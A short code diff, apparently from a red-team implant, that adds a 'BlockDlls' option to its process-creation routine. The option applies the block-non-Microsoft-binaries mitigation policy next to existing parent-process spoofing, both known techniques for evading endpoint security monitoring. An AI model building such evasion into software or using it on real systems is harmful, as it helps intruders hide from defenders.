@@ -77,6 +77,11 @@ auto DECLFN Process::Create(
         Success = Self->Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &PsHandle, sizeof( HANDLE ), 0, 0 );
         if ( ! Success ) { goto _KH_END; }
     }
+    if ( Self->Ps->Ctx.BlockDlls ) {
+        UPTR Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+        Success = Self->Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UPTR ), nullptr, nullptr );
+        if ( ! Success ) { goto _KH_END; }
+    }
     if ( Self->Ps->Ctx.ParentID || Self->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)AttrBuff;
 
     if ( Self->Ps->Ctx.Pipe ) {
